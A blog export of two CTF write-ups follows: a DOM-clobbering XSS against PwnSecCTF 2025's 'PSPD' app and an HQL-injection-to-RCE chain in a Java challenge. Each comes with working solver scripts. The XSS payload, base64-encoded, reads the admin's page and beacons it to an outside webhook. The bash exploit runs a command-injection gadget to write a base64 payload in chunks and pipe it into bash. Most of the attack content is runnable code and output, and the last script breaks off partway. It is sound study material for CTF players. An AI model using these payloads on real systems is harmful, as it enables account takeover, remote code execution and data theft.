[{"content":"Overview They begged me not to do it, but I had to. Can you bring PwnSec\u0026rsquo;s Police Department to a clojure?\nChallenge author: aelmo\nSolves: 2\n1. General Analysis The application is written in Clojure, however the challenge doesn\u0026rsquo;t involve anything specific to it. The flag is located in the admin bot\u0026rsquo;s journal. It\u0026rsquo;s not protected by any auth check - all we have to do is learn the admin\u0026rsquo;s user id.\n2. Self XSS on the main page index.html contains the following snippet.\nuserDataElement.insertAdjacentHTML( \u0026#34;beforeend\u0026#34;, `\u0026lt;p style=\u0026#39;margin-top: 3rem;\u0026#39;\u0026gt;Not agent \u0026lt;b\u0026gt;${decodeURIComponent( userData.username )}\u0026lt;/b\u0026gt;? Report this incident to +111-337-1337\u0026lt;/p\u0026gt;` ); userData.username is unsanitized and inserted as HTML meaning it\u0026rsquo;s vulnerable to XSS. userData comes from loadUserData.js.\n(async () =\u0026gt; { let { uid } = document.currentScript.dataset; // load the fallback uid if (uid) { window.uid = uid; } else { uid = window.uid; } // uid must be available console.log(uid); userData = await (await fetch(`/users/${uid}`)).json(); console.log(userData); })(); Which is included as a script in index.html.\n\u0026lt;script src=\u0026#34;/static/js/clientsideUIDFallback.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script data-uid=\u0026#34;{{user-id}}\u0026#34; src=\u0026#34;static/js/loadUserData.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; And the user-id is assigned from session in core.clj.\n[(defroutes app-routes (-\u0026gt; (GET \u0026#34;/\u0026#34; [user-id :as {{user-id :user-id} :session}] (render-file \u0026#34;static/index.html\u0026#34; {:title \u0026#34;Control Panel\u0026#34; :user-id user-id})) (wrap-routes wrap-authenticated?)) ... We can\u0026rsquo;t manipulate the session of the bot directly to change their user id.\n3. Relative path bug The page also loads clientsideUIDFallback.js which assigns window.uid from a query parameter.\n(async () =\u0026gt; { // our devs said the clojure templater is not reliable // this hack should ensure our 99.99999999% agent page // availability uid = new URLSearchParams(location.search).get(\u0026#34;user-id\u0026#34;); window.dispatchEvent(new CustomEvent(\u0026#34;clj-uid-loaded\u0026#34;, { uid: window.uid })); })(); The comment might make us wrongly assume the issue has something to do with the clojure templater, but the bug is in the way the scripts are loaded.\n\u0026lt;script src=\u0026#34;/static/js/clientsideUIDFallback.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script data-uid=\u0026#34;{{user-id}}\u0026#34; src=\u0026#34;static/js/loadUserData.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; If we navigate to index.html via the static route /static/index.html, clientsideUIDFallback.js will still load correctly since it\u0026rsquo;s using an absolute path, while loadUserData.js will be attempted to load from /static/static/js/loadUserData.js which will lead to 404.\n4. DOM Clobber Once we navigate to /static/index.html?user-id=OUR_USER_ID, only clientsideUIDFallback.js will load. Sadly, userData was assigned only in loadUserData.js so we can\u0026rsquo;t perform the self XSS directly. Let\u0026rsquo;s analyze further what\u0026rsquo;s happening when we visit the page using /static/index.html?user-id=OUR_USER_ID.\n\u0026lt;script\u0026gt; let DOMPurifyConfig = { // just enough for our basic journals ALLOWED_TAGS: [\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;i\u0026#34;, \u0026#34;ul\u0026#34;, \u0026#34;ol\u0026#34;, \u0026#34;li\u0026#34;], FORBID_ATTR: [\u0026#34;name\u0026#34;], }; let userDataElement = document.querySelector(\u0026#34;#userContainer\u0026#34;); // polling user data because my scripts are not preserving order // is it because of the async? ü§∑‚Äç‚ôÇÔ∏è let polls = 0; let pollUserData = setInterval(async () =\u0026gt; { polls++; if (polls \u0026gt; 20 || (userData \u0026amp;\u0026amp; uid)) { clearInterval(pollUserData); userDataElement.removeAttribute(\u0026#34;aria-busy\u0026#34;); userDataElement.innerText = \u0026#34;\u0026#34;; let userJournal = await ( await fetch(`/users/${uid}/journal`) ).json(); console.log(userJournal); // they told me its good for security ü§∑ userJournal = userJournal.replace(/textarea/gi, \u0026#34;\u0026#34;); userDataElement.insertAdjacentHTML( \u0026#34;afterbegin\u0026#34;, ` \u0026lt;h2\u0026gt;Edit Journal\u0026lt;/h2\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; action=\u0026#34;/users/{{user-id}}\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;journal\u0026#34;\u0026gt;\u0026lt;/label\u0026gt; \u0026lt;textarea id=\u0026#34;journal\u0026#34; name=\u0026#34;journal\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;${DOMPurify.sanitize( userJournal, DOMPurifyConfig )}\u0026lt;/textarea\u0026gt; \u0026lt;button\u0026gt;Update\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; ` ); userDataElement.insertAdjacentHTML( \u0026#34;afterbegin\u0026#34;, ` \u0026lt;hgroup\u0026gt; \u0026lt;h2\u0026gt;Journal\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;Agent\u0026#39;s Incident Journal\u0026lt;/h3\u0026gt; \u0026lt;/hgroup\u0026gt; \u0026lt;div class=\u0026#34;journal-container\u0026#34;\u0026gt;${DOMPurify.sanitize( userJournal, DOMPurifyConfig )}\u0026lt;/div\u0026gt;` ); try { const displayUserData = [ \u0026#34;id\u0026#34;, \u0026#34;username\u0026#34;, \u0026#34;password\u0026#34;, \u0026#34;is-admin\u0026#34;, ]; // gracefully populate userData dependent UI let preEl = document.createElement(\u0026#34;pre\u0026#34;); preEl.innerText = `// userData - debug_id: ${(crypto?.randomUUID \u0026amp;\u0026amp; crypto.randomUUID()) || NaN }\\n` + JSON.stringify(userData, undefined, 2) + \u0026#34;\\n\\n\u0026#34;; userDataElement.insertAdjacentElement(\u0026#34;afterbegin\u0026#34;, preEl); userDataElement.insertAdjacentHTML( \u0026#34;beforeend\u0026#34;, `\u0026lt;p style=\u0026#39;margin-top: 3rem;\u0026#39;\u0026gt;Not agent \u0026lt;b\u0026gt;${decodeURIComponent( userData.username )}\u0026lt;/b\u0026gt;? Report this incident to +111-337-1337\u0026lt;/p\u0026gt;` ); } catch (err) { console.error(err); } } }, 100); \u0026lt;/script\u0026gt; The script will keep polling until polls reaches 21, since userData is unset. Afterwards, /users/${uid}/journal will be fetched, sanitized with DOMPurify and inserted as HTML into the userDataElement. The DOMPurify config allows us to use tags \u0026quot;a\u0026quot;, \u0026quot;b\u0026quot;, \u0026quot;i\u0026quot;, \u0026quot;ul\u0026quot;, \u0026quot;ol\u0026quot;, \u0026quot;li\u0026quot; and forbids \u0026quot;name\u0026quot; attribute. We need to perform a two levels deep clobber of userData.username with our XSS payload, but we\u0026rsquo;re heavily restricted. For example, we can\u0026rsquo;t do it by nested forms. Instead, we opt for a trick with a tag and username part in the href URL.\nGiven a element like this:\n\u0026lt;a href=\u0026#34;https://MY_USERNAME@x.com\u0026#34; id=\u0026#34;userData\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; userData will resolve to the a tag because of the id, then userData.username will resolve to MY_USERNAME, because it\u0026rsquo;s the username part of the URL (the part after the procotol https:// and before @ which delimits it from the host). Here\u0026rsquo;s how our payload will look like.\n\u0026lt;a href=\u0026#34;https://%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27ZmV0Y2goJy8nKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGI9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCdodHRwOi8vNTE2NTNmM2YtYTVhNi00Y2RiLWE3YTctNWQwZmIwNWIwZDNjLndlYmhvb2suc2l0ZScsYikp%27%29%29%20%2F%3E@x.com\u0026#34; id=\u0026#34;userData\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; 5. Exploit Plan Create a user and write down our id, Insert DOM clobbering payload into our journal that will leak admin\u0026rsquo;s id from the page, Send the admin bot to /static/index.html?user-id=OUR_USER_ID, Navigate to /users/ADMIN_USER_ID/journal to get the flag. 6. Solver Script import requests import secrets import string import re from urllib.parse import quote BASE_URL = \u0026#34;http://127.0.0.1:1580\u0026#34; def random_alnum(length=16): alphabet = string.ascii_letters + string.digits return \u0026#39;\u0026#39;.join(secrets.choice(alphabet) for _ in range(length)) def main(): session = requests.Session() username = random_alnum(16) password = random_alnum(16) print(f\u0026#34;[+] Using username: {username}\u0026#34;) print(f\u0026#34;[+] Using password: {password}\u0026#34;) # 1. Register signup_url = f\u0026#34;{BASE_URL}/users/signup\u0026#34; signup_data = { \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password, } r = session.post(signup_url, data=signup_data) print(f\u0026#34;[+] Signup status: {r.status_code}\u0026#34;) # 2. Login signin_url = f\u0026#34;{BASE_URL}/users/signin\u0026#34; signin_data = { \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password, } r = session.post(signin_url, data=signin_data) print(f\u0026#34;[+] Signin status: {r.status_code}\u0026#34;) # 2.5 Fetch / and extract TARGET_USER_ID from: # \u0026lt;script data-uid=\u0026#34;...uuid-here...\u0026#34; src=\u0026#34;static/js/loadUserData.js\u0026#34;\u0026gt; home_url = f\u0026#34;{BASE_URL}/\u0026#34; r = session.get(home_url) print(f\u0026#34;[+] GET / status: {r.status_code}\u0026#34;) m = re.search(r\u0026#39;data-uid=\u0026#34;([0-9a-f-]+)\u0026#34;\u0026#39;, r.text) if not m: print(\u0026#34;[-] Could not find data-uid in home page HTML\u0026#34;) return target_uid = m.group(1) print(f\u0026#34;[+] Extracted TARGET_USER_ID: {target_uid}\u0026#34;) # 3. Update journal for the TARGET_USER_ID with the provided payload update_url = f\u0026#34;{BASE_URL}/users/{target_uid}\u0026#34; # Modify the payload to leak to your webhook journal_body = ( \u0026#34;journal=%3Ca+id%3D%22userData%22+href%3D%22https%3A%2F%2F%253Cimg%2520src%253Dx%2520onerror%253Deval%2528atob%2528%2527\u0026#34; \u0026#34;ZmV0Y2goJy8nKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGI9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCdodHRwOi8vNTE2NTNmM2YtYTVhNi00Y2RiLWE3YTctNWQwZmIwNWIwZDNjLndlYmhvb2suc2l0ZScsYikp\u0026#34; \u0026#34;%2527%2529%2529%2520%252F%253E%40x.com%22%3E%3C%2Fa%3E\u0026#34; ) headers_form = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, } r = session.post(update_url, data=journal_body, headers=headers_form) print(f\u0026#34;[+] Journal update status: {r.status_code}\u0026#34;) # 4. Send bot via /report/ report_url = f\u0026#34;{BASE_URL}/report/\u0026#34; # Build the URL parameter dynamically with the extracted UID target_page = f\u0026#34;http://proxy/static/index.html?user-id={target_uid}\u0026#34; report_body = \u0026#34;url=\u0026#34; + quote(target_page, safe=\u0026#34;\u0026#34;) report_headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded; charset=UTF-8\u0026#34;, \u0026#34;X-Requested-With\u0026#34;: \u0026#34;XMLHttpRequest\u0026#34;, } r = session.post(report_url, data=report_body, headers=report_headers) print(f\u0026#34;[+] Report submission status: {r.status_code}\u0026#34;) print(\u0026#34;[+] Done. Bot should now hit the injected journal page (if challenge is set correctly).\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() (base) vboxuser@kali /mnt/repos/pwnsecctf-2025/pspd $ python3 a.py [+] Using username: xPDX74U8rux9TNFA [+] Using password: pLhXq4cBwJuOGPcB [+] Signup status: 200 [+] Signin status: 200 [+] GET / status: 200 [+] Extracted TARGET_USER_ID: 5305e533-66dc-4e67-afb6-dbe90431abd7 [+] Journal update status: 200 [+] Report submission status: 200 [+] Done. Bot should now hit the injected journal page (if challenge is set correctly). Upon running it, we receive the main page with the admin\u0026rsquo;s id in our webhook.\nThen we navigate to the journal and get the flag.\n7. Final Notes I was misled by the comments and the older version of selmer in the project, but in the end it was all HTML and Javascript.\nXOXO,\nVXXDXX\n","permalink":"http://localhost:1313/posts/pwnsecctf-2025-pspd/","summary":"\u003ch2 id=\"overview\"\u003eOverview\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThey begged me not to do it, but I had to. Can you bring PwnSec\u0026rsquo;s Police Department to a clojure?\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eChallenge author: aelmo\u003cbr\u003e\nSolves: 2\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"solves.png\" alt=\"Solves\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"1-general-analysis\"\u003e1. General Analysis\u003c/h2\u003e\n\u003cp\u003eThe application is written in Clojure, however the challenge doesn\u0026rsquo;t involve anything specific to it. The flag is located in the admin bot\u0026rsquo;s journal. It\u0026rsquo;s not protected by any auth check - all we have to do is learn the admin\u0026rsquo;s user id.\u003c/p\u003e","title":"PwnSecCTF 2025 PSPD"},{"content":"Overview Please note that this challenge has no outgoing network access.\nChallenge author: irogir\nSolves: 3\nFun challenge focused mostly on RCE via HQL.\n1. General Analysis The challenge deployment consists of 3 containers:\norder_service, authn_service containing the flag, mysql We can reach any container from within another, but only order_service is exposed externally. Both order_service and authn_service are Java applications that use HQL to query the underlying databases; however, order_service uses mysql from another container, while authn_service opted for an in-memory H2 db.\n2. SQLi and Broken Validation in order_service The main function in order_service contains the following statement preparation, which is vulnerable to injection.\nvar sql = \u0026#34;select %s from Order o where o.username=\\\u0026#34;%s\\\u0026#34;\u0026#34;.formatted(fields, authnUser); var et = HibernateUtil.getSessionFactory().createEntityManager(); var result = et.createQuery(sql).getResultList(); The input is sanitized before being inserted into the query.\npublic static boolean validateFields(String fields) { var tokens = fields.split(\u0026#34;,\u0026#34;); for (var i = 0; i \u0026lt; tokens.length; i++) { var token = tokens[i].trim(); // Check if it contains non-alphanumeric character if (Pattern.matches(\u0026#34;\\\\W\u0026#34;, token)) { return false; } } return true; } There\u0026rsquo;s a subtle bug in it. Pattern.matches returns true only if the whole input matches the given regex. With the way the code is written, only input consisting of one non-word character will make the validation fail.\n3. SQLi in authn_service Similarly, authn_service is also susceptible to SQL injection.\nvar sql = \u0026#34;select s from Session s where s.sessionId = \\\u0026#34;%s\\\u0026#34;\u0026#34;.formatted(sessionId); authn_service does no validation itself on the input. This endpoint is used by order_service, but in this case, it correctly validates our input, so we can\u0026rsquo;t exploit this injection indirectly via order_service.\n4. Exploiting SQLi in order_service We\u0026rsquo;re going to exploit the SQLi in the order_service in two different ways:\nFile write/file read in the mysql container, Code execution in the order_service container. File Write/File Read in the mysql Container For this one, we\u0026rsquo;re going to use the sql() method to embed native SQL in HQL, allowing us to call LOAD_FILE and SELECT ... INTO OUTFILE ... from mysql and end the statement early with a comment.\nThe mysql server has secure_file_priv set to /var/lib/mysql-files/.\nmysql\u0026gt; SHOW VARIABLES LIKE \u0026#39;secure_file%\u0026#39;; +------------------+-----------------------+ | Variable_name | Value | +------------------+-----------------------+ | secure_file_priv | /var/lib/mysql-files/ | +------------------+-----------------------+ As the docs state:\nIf set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.\nIf we weren\u0026rsquo;t limited by this, we could write and load UDFs to gain RCE. At least, we can still write and read arbitrary data in /var/lib/mysql-files/.\nAs we can see, even though the first request resulted in 500 status code due to Column index out of range, the file write still went through.\nRCE in the orders_container via JdiInitiator Constructor As mentioned before, one interesting quirk of HQL is that it allows us to call constructors of Java classes with the new keyword in the query. For the majority of classes, the constructors do simple assignments of the class fields, so they\u0026rsquo;re not useful at all. One major exception is JdiInitiator. As the docs state\nStart the remote agent and establish a JDI connection to it.\nThis boils down to launching the java executable with a bunch of arguments that we can affect by the constructor arguments. What caught my eye immediately was the customConnectorArgs argument:\ncustomConnectorArgs - custom arguments passed to the connector. These are JDI com.sun.jdi.connect.Connector arguments. The vmexec argument is not supported.\nThese arguments are a map that\u0026rsquo;s passed to SunCommandLineLauncher. We can see the available argument names:\nprivate static final String ARG_HOME = \u0026#34;home\u0026#34;; private static final String ARG_OPTIONS = \u0026#34;options\u0026#34;; private static final String ARG_MAIN = \u0026#34;main\u0026#34;; private static final String ARG_INIT_SUSPEND = \u0026#34;suspend\u0026#34;; private static final String ARG_QUOTE = \u0026#34;quote\u0026#34;; private static final String ARG_VM_EXEC = \u0026#34;vmexec\u0026#34;; static private final String ARG_VM_INCLUDE_VTHREADS = \u0026#34;includevirtualthreads\u0026#34;; Also, the command is launched with the following code:\nString command = exePath + \u0026#39; \u0026#39; + options + \u0026#39; \u0026#39; + \u0026#34;-Xdebug \u0026#34; + \u0026#34;-Xrunjdwp:\u0026#34; + xrun + \u0026#39; \u0026#39; + mainClassAndArgs; // System.err.println(\u0026#34;Command: \\\u0026#34;\u0026#34; + command + \u0026#39;\u0026#34;\u0026#39;); vm = launch(tokenizeCommand(command, quote.charAt(0)), address, listenKey, transportService()); exePath is prepended with the value of home\nif (home.length() \u0026gt; 0) { exePath = home + File.separator + \u0026#34;bin\u0026#34; + File.separator + exe; } else { exePath = exe; } And we can control it!\nString home = argument(ARG_HOME, arguments).value(); Sadly, whatever we put will be appended with /bin/${exe}. The value of exe comes from vm_exec\nString exe = argument(ARG_VM_EXEC, arguments).value(); Which, as was noted in the docs, we can\u0026rsquo;t set. But it\u0026rsquo;s not over yet! Going deeper, tokenizeCommand tokenizes the command respecting a quote character that we control.\nString quote = argument(ARG_QUOTE, arguments).value(); New plan: supply a custom ARG_QUOTE and ARG_HOME containing full RCE command abusing custom ARG_QUOTE to split it\nEkhm, before we proceed, quick tl;dr for cancer HQL syntax:\ncreate new lists with new list(\u0026quot;a\u0026quot;,\u0026quot;b\u0026quot;,\u0026quot;c\u0026quot;), create new maps with new map(\u0026quot;value1\u0026quot; as key1, \u0026quot;value2\u0026quot; as key2), you might have to do additional fucky-wacky to stop this bitch moaning about \u0026ldquo;syntax exceptions\u0026rdquo; and \u0026ldquo;The used SELECT statements have a different number of columns\u0026rdquo;. We\u0026rsquo;re gonna use ^ as our quote character.\nLet\u0026rsquo;s check the logs:\norder_service-1 | Caused by: com.sun.jdi.connect.VMStartException: VM initialization failed for: bash -c id\u0026gt;/tmp/win /bin/java -Xdebug -Xrunjdwp:transport=dt_socket,address=localhost:41925,suspend=y,includevirtualthreads=n asdf 5 Let\u0026rsquo;s check the output of strace:\n[pid 150] execve(\u0026#34;/usr/bin/bash\u0026#34;, [\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;id\u0026gt;/tmp/win\u0026#34;, \u0026#34;/bin/java\u0026#34;, \u0026#34;-Xdebug\u0026#34;, \u0026#34;-Xrunjdwp:transport=dt_socket,address=localhost:41925,suspend=y,includevirtualthreads=n\u0026#34;, \u0026#34;asdf\u0026#34;, \u0026#34;5\u0026#34;], [\u0026#34;HOSTNAME=kali\u0026#34;, \u0026#34;LANGUAGE=en_US:en\u0026#34;, \u0026#34;JAVA_HOME=/opt/java/openjdk\u0026#34;, \u0026#34;PWD=/app\u0026#34;, \u0026#34;PORT=1337\u0026#34;, \u0026#34;HOME=/nonexistent\u0026#34;, \u0026#34;LANG=en_US.UTF-8\u0026#34;, \u0026#34;JRE_CACERTS_PATH=/opt/java/openjdk/lib/security/cacerts\u0026#34;, \u0026#34;SHLVL=0\u0026#34;, \u0026#34;LC_ALL=en_US.UTF-8\u0026#34;, \u0026#34;PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;JAVA_VERSION=jdk-21.0.8+9\u0026#34;]) = 0 Let\u0026rsquo;s check the file system:\nnobody@kali:/app$ cat /tmp/win uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) It works!\n5. File Read Oracle in authn_service The dist files in authn_service contain the file /root/flag.s which contains the flag. This file is compiled into an executable binary file /flagthat prints it out. The file /root/flag.s doesn\u0026rsquo;t get removed by the deployment after /flag is compiled. Furthermore, the authn_service is run as root. One man\u0026rsquo;s trash is another man\u0026rsquo;s treasure.\nroot@kali:/app# grep -iaobR \u0026#39;sekai\u0026#39; /root /root/flag.s:314:SEKAI root@kali:/app# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 7340 3488 ? Ss 11:45 0:00 /bin/bash /entrypoint.sh root 13 0.2 0.5 11976896 191844 ? Sl 11:45 0:20 java -jar target/hn-1.0-SNAPSHOT-jar-with-dependencies.jar root 47 0.0 0.0 7604 4180 pts/0 Ss 14:31 0:00 bash root 65 0.0 0.0 10880 4404 pts/0 R+ 14:35 0:00 ps aux This time, the SQL injection is after the where clause:\nvar sql = \u0026#34;select s from Session s where s.sessionId = \\\u0026#34;%s\\\u0026#34;\u0026#34;.formatted(sessionId); var result = et.createQuery(sql).getResultList(); if (result.isEmpty()) { code = 401; yield \u0026#34;Unauthorized\u0026#34;; } var session = (Session) result.get(0); yield \u0026#34;user=\u0026#34; + session.user.username; If there\u0026rsquo;s a result, we get 200 response back; otherwise, the server responds with 401. We\u0026rsquo;re going to use SUBSTRING and FILE_READ to create an oracle that checks for a char at given position in the flag. We can confirm it works with the following 2 requests (note: I exposed authn_service locally to make it easier to debug).\n6. Putting the Pieces Together Let\u0026rsquo;s list what we\u0026rsquo;ve got:\nfile write and file read in mysql container under /var/lib/mysql-files/, RCE in orders_service, file read oracle in authn_service. By combining all of these together, we can perform code execution in orders_service that will read the flag char by char from authn_service and then upload it to mysql container under /var/lib/mysql-files/. Afterwards, we can read the uploaded flag. Our exploit script will upload the oracle script chunk by chunk onto the orders_service container, run it, and poll for the flag in mysql.\n7. Solver Script exploit.sh\n#!/bin/bash # ============================================================================== # --- CONFIGURATION --- # ============================================================================== # --- Stage 1 \u0026amp; 2: Authentication and Template Processing --- LOGIN_URL=\u0026#34;http://127.0.0.1:1337/login\u0026#34; TEMPLATE_FILE=\u0026#34;payload_template.sh\u0026#34; GENERATED_PAYLOAD_FILE=\u0026#34;payload.sh\u0026#34; # --- Stage 3: RCE Trigger --- RCE_URL=\u0026#34;http://127.0.0.1:1337/orders\u0026#34; # ============================================================================== # --- HELPER FUNCTION (URL ENCODE) --- # ============================================================================== urlencode() { local string=\u0026#34;${1}\u0026#34; local strlen=${#string} local encoded=\u0026#34;\u0026#34; local pos c o for (( pos=0 ; pos\u0026lt;strlen ; pos++ )); do c=${string:$pos:1} case \u0026#34;$c\u0026#34; in [-_.~a-zA-Z0-9] ) o=\u0026#34;${c}\u0026#34; ;; * ) printf -v o \u0026#39;%%%02x\u0026#39; \u0026#34;\u0026#39;$c\u0026#34; esac encoded+=\u0026#34;${o}\u0026#34; done echo \u0026#34;${encoded}\u0026#34; } # ============================================================================== # --- MAIN SCRIPT LOGIC --- # ============================================================================== # --- STAGE 1: AUTHENTICATE AND GET SESSION ID --- echo \u0026#34;--- Stage 1: Authenticating to get a new session ID ---\u0026#34; SESSION_ID=$(curl -s -X POST \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ --data \u0026#34;username=guest\u0026amp;password=guest\u0026#34; \\ \u0026#34;$LOGIN_URL\u0026#34;) if [[ -z \u0026#34;$SESSION_ID\u0026#34; ]]; then echo \u0026#34;Error: Failed to retrieve a session ID from $LOGIN_URL. Aborting.\u0026#34; \u0026gt;\u0026amp;2 exit 1 fi echo \u0026#34;Successfully retrieved session ID: $SESSION_ID\u0026#34; echo \u0026#34;\u0026#34; # --- STAGE 2: GENERATE PAYLOAD SCRIPT FROM TEMPLATE --- echo \u0026#34;--- Stage 2: Processing the payload template ---\u0026#34; if [[ ! -r \u0026#34;$TEMPLATE_FILE\u0026#34; ]]; then echo \u0026#34;Error: The template file \u0026#39;$TEMPLATE_FILE\u0026#39; was not found or is not readable. Aborting.\u0026#34; \u0026gt;\u0026amp;2 exit 1 fi sed \u0026#34;s/\u0026lt;\u0026lt;SESSION_ID_HERE\u0026gt;\u0026gt;/$SESSION_ID/g\u0026#34; \u0026#34;$TEMPLATE_FILE\u0026#34; \u0026gt; \u0026#34;$GENERATED_PAYLOAD_FILE\u0026#34; echo \u0026#34;Generated payload script and saved it to \u0026#39;$GENERATED_PAYLOAD_FILE\u0026#39;.\u0026#34; echo \u0026#34;\u0026#34; # --- STAGE 3: BASE64 ENCODE PAYLOAD \u0026amp; SEND IN 10 CHUNKS --- echo \u0026#34;--- Stage 3: Encoding payload and triggering RCE via JdiInitiator gadget (10 chunks) ---\u0026#34; if [[ ! -r \u0026#34;$GENERATED_PAYLOAD_FILE\u0026#34; ]]; then echo \u0026#34;Error: The generated payload file \u0026#39;$GENERATED_PAYLOAD_FILE\u0026#39; could not be read. Aborting.\u0026#34; \u0026gt;\u0026amp;2 exit 1 fi # 1) Base64 encode without wrapping. PAYLOAD_B64=$(base64 -w 0 \u0026#34;$GENERATED_PAYLOAD_FILE\u0026#34;) if [[ -z \u0026#34;$PAYLOAD_B64\u0026#34; ]]; then echo \u0026#34;Error: Failed to Base64 encode the payload. Aborting.\u0026#34; \u0026gt;\u0026amp;2 exit 1 fi # 2) Split into 10 (approximately equal) chunks. TOTAL_LEN=${#PAYLOAD_B64} CHUNK_COUNT=10 CHUNK_SIZE=$(( (TOTAL_LEN + CHUNK_COUNT - 1) / CHUNK_COUNT )) # ceil # 3) Template for \u0026#39;fields\u0026#39; with placeholder to swap the RCE command. TEMPLATE_FIELDS=\u0026#39;new jdk.jshell.execution.JdiInitiator(5, new list(\u0026#34;-XX:OnError=id\u0026gt;/tmp/err.rce\u0026#34;,\u0026#34;-XX:OnOutOfMemoryError=id\u0026gt;/tmp/err2.rce\u0026#34;,\u0026#34;-XX:+CrashOnOutOfMemoryError\u0026#34;,\u0026#34;-jar /app/target/hn-1.0-SNAPSHOT-jar-with-dependencies.jar\u0026#34;), new java.lang.String(\u0026#34;asdf\u0026#34;), true, null, 8000, new map(\u0026#34;^\u0026#34; as quote,\u0026#34;^bash^-c^^id\u0026gt;/tmp/winz2^^\u0026#34; as home)) UNION select new jdk.jshell.execution.JdiInitiator(0, new list(\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;,\u0026#34;d\u0026#34;), new java.lang.String(\u0026#34;jdk.jshell.execution.RemoteExecutionControl\u0026#34;), true, null, 8000, new java.util.HashMap(2,2))\u0026#39; echo \u0026#34;Total length: $TOTAL_LEN, chunk size: $CHUNK_SIZE\u0026#34; for (( i=0; i\u0026lt;CHUNK_COUNT; i++ )); do START=$(( i * CHUNK_SIZE )) PART=\u0026#34;${PAYLOAD_B64:$START:$CHUNK_SIZE}\u0026#34; [[ -z \u0026#34;$PART\u0026#34; ]] \u0026amp;\u0026amp; { echo \u0026#34;No more data to send at chunk $((i+1)).\u0026#34;; break; } echo \u0026#34;\u0026#34; echo \u0026#34;\u0026gt;\u0026gt;\u0026gt; Preparing request $((i+1))/${CHUNK_COUNT} (bytes ${START}..$((START+${#PART}-1))) (Status 500 is OK)\u0026#34; # 4) Build the RCE command for this chunk (append to /tmp/b64). # \\${IFS} creates a space between \u0026#39;echo\u0026#39; and data at execution time. RCE_COMMAND=\u0026#34;echo\\${IFS}$PART\u0026gt;\u0026gt;/tmp/b64\u0026#34; # 5) Substitute the placeholder in the fields template. MODIFIED_TEMPLATE=$(echo \u0026#34;$TEMPLATE_FIELDS\u0026#34; | sed \u0026#39;s*id\u0026gt;/tmp/winz2*__RCE_COMMAND_PLACEHOLDER__*\u0026#39;) FIELDS_PAYLOAD_RAW=$(echo \u0026#34;$MODIFIED_TEMPLATE\u0026#34; | sed \u0026#34;s*__RCE_COMMAND_PLACEHOLDER__*${RCE_COMMAND}*\u0026#34;) # 6) URL-encode the \u0026#39;fields\u0026#39; and build the POST body. FIELDS_PAYLOAD_ENCODED=$(urlencode \u0026#34;$FIELDS_PAYLOAD_RAW\u0026#34;) DATA=\u0026#34;sessionId=${SESSION_ID}\u0026amp;fields=${FIELDS_PAYLOAD_ENCODED}\u0026#34; # 7) Wait 1.5 seconds before each request, then send it. sleep 1.5 curl -s -o /dev/null -w \u0026#34;Status:%{http_code}\\n\u0026#34; -X POST \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -H \u0026#34;User-Agent: Mozilla/5.0 (Exploit Script)\u0026#34; \\ -H \u0026#34;Accept: */*\u0026#34; \\ --data-binary \u0026#34;$DATA\u0026#34; \\ \u0026#34;$RCE_URL\u0026#34; done sleep 1.5 RCE_TRIGGER_COMMAND=\u0026#34;cat\\${IFS}/tmp/b64|base64\\${IFS}-d|bash\u0026#34; FIELDS_PAYLOAD_TRIGGER_RAW=$(echo \u0026#34;$MODIFIED_TEMPLATE\u0026#34; | sed \u0026#34;s*__RCE_COMMAND_PLACEHOLDER__*${RCE_TRIGGER_COMMAND}*\u0026#34;) FIELDS_PAYLOAD_TRIGGER_ENCODED=$(urlencode \u0026#34;$FIELDS_PAYLOAD_TRIGGER_RAW\u0026#34;) DATA_TRIGGER=\u0026#34;sessionId=${SESSION_ID}\u0026amp;fields=${FIELDS_PAYLOAD_TRIGGER_ENCODED}\u0026#34; curl -s -o /dev/null -w \u0026#34;Status:%{http_code}\\n\u0026#34; -X POST \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -H \u0026#34;User-Agent: Mozilla/5.0 (Exploit Script)\u0026#34; \\ -H \u0026#34;Accept: */*\u0026#34; \\ --data-binary \u0026#34;$DATA_TRIGGER\u0026#34; \\ \u0026#34;$RCE_URL\u0026#34; echo \u0026#34;\u0026#34; echo \u0026#34;----------------------------------------------------\u0026#34; echo \u0026#34;The base64 payload was sent in chunks to /tmp/b64 and then executed.\u0026#34; echo \u0026#34;Polling for flag in mysql\u0026#34; 